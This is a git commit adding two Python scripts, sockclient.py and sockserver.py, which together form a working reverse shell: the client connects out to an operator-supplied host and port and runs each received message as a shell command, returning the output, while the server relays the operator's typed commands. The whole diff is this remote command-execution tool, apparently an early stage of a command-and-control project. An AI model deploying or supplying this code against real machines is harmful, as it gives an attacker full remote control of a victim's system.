274af980849ff1918c3e7cd83c90a6082b08c683
khronos <38446873+khronos2@users.noreply.github.com>
2023-11-23 14:12:28 -0600

    Basic functions and refactoring

---
+++ sockclient.py
@@ -0,0 +1,47 @@
+#!/usr/bin/env python3
+
+import socket
+import subprocess
+import os
+import sys
+
+def inbound():
+    print('[+] Awaiting response...')
+    message = ''
+    while True:
+        try:
+            message = sock.recv(1024).decode()
+            return message
+        except Exception:
+            sock.close()
+
+def outbound(message):
+    response = str(message).encode()
+    sock.send(response)
+
+def session_handler():
+    print(f'[+] Connecting to {host_ip}.')
+    sock.connect((host_ip, host_port))
+    print(f'[+] Connected to {host_ip}.')
+    while True:
+        message = inbound()
+        print(f'[+] Message received - {message}')
+        if message == 'exit':
+            print ('[-] The server has terminated the session.')
+            sock.close()
+            break
+        elif message.split(" ")[0] == 'cd':
+            directory = str(message.split(" ")[1])
+            os.chdir(directory)
+            cur_dir = os.getcwd()
+            print(f'[+] Changed to {cur_dir}')
+            sock.send(cur_dir.encode())
+        else:
+            command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            output = command.stdout.read() + command.stderr.read()
+            sock.send(output)
+    
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+host_ip = sys.argv[1]
+host_port = int(sys.argv[2])
+session_handler()
---
+++ sockserver.py
@@ -0,0 +1,57 @@
+#!/usr/bin/env python3
+
+import socket
+import sys
+
+def comm_in(remote_target):
+    print('[+] Awaiting response...')
+    response = remote_target.recv(1024).decode()
+    return response
+
+def comm_out(remote_target, message):
+    remote_target.send(message.encode())
+
+def listener_handler():
+
+    sock.bind((host_ip, host_port))
+    print('[+] Awaiting connection from client...')
+    sock.listen()
+    remote_target, remote_ip = sock.accept()
+    comm_handler(remote_target, remote_ip)
+
+def comm_handler(remote_target, remote_ip):
+    print(f'[+] Connection received from {remote_ip[0]}')
+    
+    while True:
+        try:
+            message = input('Message to send#> ')
+
+            if message == 'exit':
+                remote_target.send(message.encode())
+                remote_target.close()
+                break
+
+            remote_target.send(message.encode())
+            response = remote_target.recv(1024).decode()
+
+            if response == 'exit':
+                print('[-] The client has terminated the session.')
+                remote_target.close()
+                break
+
+            print(response)
+        except KeyboardInterrupt:
+            print("\nKeyboardInterrupt")
+            remote_target.close()
+            break
+        except Exception:
+            remote_target.close()
+            break
+
+
+
+if __name__ == '__main__':
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    host_ip = sys.argv[1]
+    host_port = int(sys.argv[2])
+    listener_handler()
